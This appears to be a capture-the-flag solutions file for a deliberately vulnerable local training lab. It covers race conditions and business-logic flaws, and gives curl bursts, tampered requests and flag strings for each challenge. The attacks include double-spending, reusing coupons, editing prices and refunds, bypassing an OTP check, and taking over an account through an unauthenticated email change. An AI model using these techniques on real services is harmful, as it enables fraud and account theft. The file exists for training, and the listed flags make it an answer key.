# PenTrix VulnLab – Solutions (batch 08: race + bizlogic)

Walkthroughs for the 16 Race Conditions and Business Logic Flaws challenges.
Base URL for every payload below: `http://localhost:3000`
(reset lab state first: `GET /race/reset`, `GET /bizlogic/reset`).

---

## race – Race Conditions

**1. Single-Use Coupon Redeemed Twice** – `PENTRIX{race_race-coupon}`
The coupon page redeems coupon RACE10 ($10 credit, one use). One click redeems it
once; twenty at the same instant redeem it many times:
```
curl -s http://localhost:3000/race/reset -o /dev/null
seq 1 20 | xargs -P20 -I{} curl -s -X POST http://localhost:3000/race/coupon/redeem
```
Reload `/race/coupon`: the one-use coupon shows several redemptions and the
credit is a multiple of $10. One of the responses contains the flag.
Why it works: the "already used?" check and the "mark used" write are separated
by an async pause, so parallel requests all read `used=false` before any write
lands (time-of-check to time-of-use).

**2. Double-Spend the Balance** – `PENTRIX{race_race-balance}`
The wallet holds $100. Fire 20 parallel transfers of the full $100:
```
curl -s http://localhost:3000/race/reset -o /dev/null
seq 1 20 | xargs -P20 -I{} curl -s -X POST http://localhost:3000/race/transfer -d 'to=attacker&amount=100'
```
Reload `/race/transfer`: the balance is deep negative (e.g. -$1900) and the
ledger lists all 20 transfers. One of the responses contains the flag.
Why it works: every request passes the `balance >= amount` check against the
same starting balance before any debit is applied, so the wallet spends money it
never had.

**3. Vote Counted Twice** – `PENTRIX{race_race-vote}`
The poll allows one vote per name. Two votes for the same name, sent in
parallel, both get recorded:
```
curl -s http://localhost:3000/race/reset -o /dev/null
seq 1 2 | xargs -P2 -I{} curl -s -X POST http://localhost:3000/race/vote -d 'name=voter1'
```
Reload `/race/vote`: `voter1` has 2 votes. (Voting twice sequentially is correctly
rejected with "Already voted"; only the parallel pair races.)
Why it works: the duplicate-name check and the vote insert are separated by an
async pause, so both requests pass the check before either insert happens.

**4. Referral Bonus Claimed Twice** – `PENTRIX{race_race-referral}`
Referral code REF2026 pays 50 points, claimable once. Claim it 10 times in
parallel:
```
curl -s http://localhost:3000/race/reset -o /dev/null
seq 1 10 | xargs -P10 -I{} curl -s -X POST http://localhost:3000/race/referral -d 'code=REF2026'
```
Reload `/race/referral`: claims and points are multiples of the single bonus.
Why it works: the "already claimed?" check races the claim write across the
async gap, so concurrent claims each see an unclaimed code.

**5. Duplicate Username Registration** – `PENTRIX{race_race-register}`
Usernames must be unique. Register the same name twice in parallel:
```
curl -s http://localhost:3000/race/reset -o /dev/null
seq 1 2 | xargs -P2 -I{} curl -s -X POST http://localhost:3000/race/register -d 'username=racer&password=hunter2'
```
Reload `/race/register`: two accounts named `racer` exist. (A sequential second
registration is correctly rejected with "Username taken".)
Why it works: the uniqueness check and the insert are separated by an async
pause, so both registrations pass the check before either row is inserted.

**6. Beat the AV Scan (TOCTOU)** – `PENTRIX{race_race-upload-scan}`
Uploads are served immediately but a simulated AV scan deletes each file 2
seconds later. Upload, then fetch within the window:
```
curl -s -X POST http://localhost:3000/race/upload -d 'filename=secret.txt&content=top+secret+lab+data'
curl -s http://localhost:3000/race/files/secret.txt
```
The second request returns the file content and the flag. Wait 3 seconds and
fetch again: `404: file not found`, the scan deleted it.
Why it works: the file is servable the instant it is stored while the delete
only runs later, a classic time-of-check to time-of-use gap between "stored" and
"scanned".

**7. Burst Through the Rate Limit** – `PENTRIX{race_race-ratelimit}`
The API allows 5 requests per window. The counter increments only after an async
gap, so a parallel burst all reads the old counter:
```
curl -s http://localhost:3000/race/reset -o /dev/null
seq 1 20 | xargs -P20 -I{} curl -s -X POST http://localhost:3000/race/ratelimit/hit
```
Reload `/race/ratelimit`: far more than 5 requests were counted as allowed in
one window. (Clicking sequentially stops at 5 with a 429, as intended.)
Why it works: the "under the limit?" check runs before the async pause and the
increment after it, so every request in the burst passes the check against a
stale counter.

**8. Oversell the Stock** – `PENTRIX{race_race-stock}`
Only 5 gadgets in stock. Order 5 twice, in parallel:
```
curl -s http://localhost:3000/race/reset -o /dev/null
seq 1 2 | xargs -P2 -I{} curl -s -X POST http://localhost:3000/race/stock/buy -d 'qty=5'
```
Reload `/race/stock`: 10 items sold from stock of 5, stock shows -5.
Why it works: the stock check and the decrement are separated by an async
pause, so both orders see the pre-sale stock of 5 and both go through.

---

## bizlogic – Business Logic Flaws

**1. Negative Quantity Credit** – `PENTRIX{bizlogic_biz-negative-qty}`
The checkout computes `$50 x qty` with no validation. Order -1 hoodies:
```
POST /bizlogic/negative-qty
qty=-1
```
Order total is -$50, so "charging" it credits the balance: $100 becomes $150
and the flag is awarded.
Why it works: a negative quantity turns the total negative, and subtracting a
negative total adds money instead of taking it.

**2. Client-Side Price Tampering** – `PENTRIX{bizlogic_biz-price-tamper}`
The buy form carries the price in a hidden field (`price=50`) and the server
charges whatever the browser sends:
```
POST /bizlogic/price-tamper/buy
product_id=hoodie&price=1
```
The $50 hoodie is bought for $1.00.
Why it works: the price is taken from client input and never re-checked against
the product catalog, so any submitted price is honored.

**3. Coupon Stacking Past 100%** – `PENTRIX{bizlogic_biz-coupon-stack}`
Three coupons are each "one per order": SAVE50, SAVE40, SAVE30. The discount
math adds every valid code with no cap:
```
POST /bizlogic/coupon-stack
codes=SAVE50,SAVE40,SAVE30
```
Total discount is 120%, the $50 hoodie costs -$10, and the shop pays you.
Why it works: percentages stack additively without a 100% ceiling, so combined
coupons drive the total at or below zero.

**4. OTP Verified by JavaScript** – `PENTRIX{bizlogic_biz-otp-client}`
The page JavaScript checks the OTP and sets a hidden `otp_ok=1` field; the
server only looks at that field. Skip the JavaScript entirely:
```
POST /bizlogic/otp/verify
otp=000000&otp_ok=1
```
The order is confirmed with a wrong OTP. (Entering the real demo code 739184
through the form also works but awards nothing.)
Why it works: verification happens in the browser, which the attacker controls;
the server trusts the client-supplied `otp_ok` flag instead of checking the code
itself.

**5. Checkout Step Skipped** – `PENTRIX{bizlogic_biz-workflow-skip}`
Checkout is cart, then payment, then confirm, but each step is just an endpoint
and confirm never verifies payment ran. Add to cart, then confirm directly:
```
POST /bizlogic/workflow/cart
product_id=hoodie

POST /bizlogic/workflow/confirm
```
The order is confirmed with "Payment step completed: false": a free hoodie.
Why it works: the confirm handler enforces no ordering of the workflow steps,
so the payment step can be skipped by calling the endpoint directly.

**6. Currency Confusion** – `PENTRIX{bizlogic_biz-currency}`
The $50 total is denominated in USD, but the server accepts any currency label
for that number and converts at face value:
```
POST /bizlogic/currency/pay
amount=50&currency=JPY
```
The $50 order settles as 50 JPY (about $0.34).
Why it works: a USD-denominated amount is accepted under a foreign currency
label with no real conversion, so the buyer chooses the cheapest currency.

**7. Email Change Without Re-Authentication** – `PENTRIX{bizlogic_biz-email-noreauth}`
The account email can be changed with no password confirmation, and
forgot-password sends the reset link to whatever address is on file:
```
POST /bizlogic/account/email
new_email=attacker@evil.com

POST /bizlogic/account/forgot
email=attacker@evil.com
```
The response shows the reset link (demo mode displays it). Open it and set a
new password: full account takeover, flag awarded.
Why it works: changing the email needs no re-authentication, so the attacker
reroutes the account's recovery channel to themselves and resets the password.

**8. Tampered Refund Amount** – `PENTRIX{bizlogic_biz-refund}`
Buy the $50 hoodie, then refund it. The refund form carries the amount in a
hidden field that the server never clamps to what was paid:
```
POST /bizlogic/refund/buy
product_id=hoodie

POST /bizlogic/refund
order_id=1&amount=5000
```
$5000 is refunded on a $50 order; the balance jumps accordingly.
Why it works: the refund amount is trusted from client input instead of being
looked up from the order, so any amount can be refunded.
